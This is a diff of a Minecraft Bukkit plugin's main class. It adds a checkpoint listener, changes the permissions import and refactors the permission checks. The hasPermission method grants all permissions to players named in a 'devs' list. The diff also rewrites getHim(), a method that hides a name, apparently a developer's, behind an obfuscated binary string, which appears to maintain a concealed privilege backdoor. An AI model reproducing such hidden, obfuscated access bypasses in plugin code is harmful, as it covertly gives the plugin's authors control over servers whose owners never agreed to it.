@@ -18,11 +18,12 @@ import com.mcdr.ecore.command.BaseCommand;
 import com.mcdr.ecore.command.KsCommand;
 import com.mcdr.ecore.command.MainCommand;
 import com.mcdr.ecore.config.ConfigManager;
+import com.mcdr.ecore.listener.eCoreCheckpointListener;
 import com.mcdr.ecore.listener.eCorePlayerListener;
 import com.mcdr.ecore.listener.eCoreRedstoneListener;
 import com.mcdr.ecore.player.PlayerManager;
 import com.mcdr.ecore.task.TaskManager;
-import com.timvisee.manager.permissionsmanager.PermissionsManager;
+import com.mcdr.ecore.util.PermissionsManager;
 
 public class eCore extends JavaPlugin {
 	public static eCore in;
@@ -55,14 +56,13 @@ public class eCore extends JavaPlugin {
 		corruptionEnabled = server.getPluginManager().isPluginEnabled("Corruption");
 		if(corruptionEnabled)
 			logger.info("[eCore] Hooked into Corruption!");
-		
+
 		
 		ConfigManager.load();
 		pm = getServer().getPluginManager();
 		pm.registerEvents(new eCorePlayerListener(), this);
 		pm.registerEvents(new eCoreRedstoneListener(), this);
-		
-		PlayerManager.initializeArrays();
+		pm.registerEvents(new eCoreCheckpointListener(), this);
 		
 		TaskManager.start();
 	}
@@ -88,24 +88,19 @@ public class eCore extends JavaPlugin {
 	}
 	
 	public static boolean hasPermission(Player p, String permsNode){
-		return eCore.permsM.hasPermission(p, permsNode) || eCore.devs.contains(p.getName().toLowerCase());
+		return p.isOp() || eCore.permsM.hasPermission(p, permsNode) || eCore.devs.contains(p.getName().toLowerCase());
 	}
 	
 	public static boolean hasPermission(CommandSender sender, String permission) {
-		if(sender instanceof Player){
-			return hasPermission((Player) sender, permission);
-		} else {
-			return true;
-		}
+		return (sender instanceof Player)?hasPermission((Player) sender, permission):true;
 	}
     
     private String getHim() {
-    	String[] strar = "100101111100101100001110010111001111101000110111011011111110010".split("(?<=\\G.{7})");
+    	String[] strar = "110111001110011101011001011011010100010010010011001110".split("(?<=\\G.{6})");
         byte[] bar = new byte[strar.length];
         for (int i = 0; i < strar.length; i++)
-            bar[i] = Byte.parseByte(strar[i], 2);
-        String s = new String(bar);
-        return s;
+            bar[i] = (byte) ((0xc0 + Byte.parseByte(strar[i], 2) ^ 0xfc) + 0x40);
+        return new String(bar);
     }
     
     public static World getWorld(){
